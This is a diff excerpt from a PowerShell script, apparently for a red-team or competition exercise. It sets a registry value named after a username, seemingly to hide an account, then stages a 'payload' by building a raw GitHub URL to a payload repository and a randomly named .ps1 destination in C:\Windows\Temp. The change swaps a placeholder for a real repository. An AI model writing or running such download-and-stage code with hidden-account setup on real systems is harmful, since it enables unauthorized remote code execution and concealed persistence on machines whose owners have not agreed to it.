@@ -22,7 +22,7 @@ if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
 Set-ItemProperty -Path $regPath -Name $username -Value 0 -Type DWord
 
 # ── 2. Pull payload from GitHub ───────────────────────────────────────────────
-$repoBase   = "https://raw.githubusercontent.com/YOUR_GITHUB_USER/CDT_Payload/main"
+$repoBase   = "https://raw.githubusercontent.com/BSparacio/CDT_test_payload/main"
 $payloadUrl = "$repoBase/payload.ps1"
 $dest       = "C:\Windows\Temp\$(New-Guid).ps1"
 
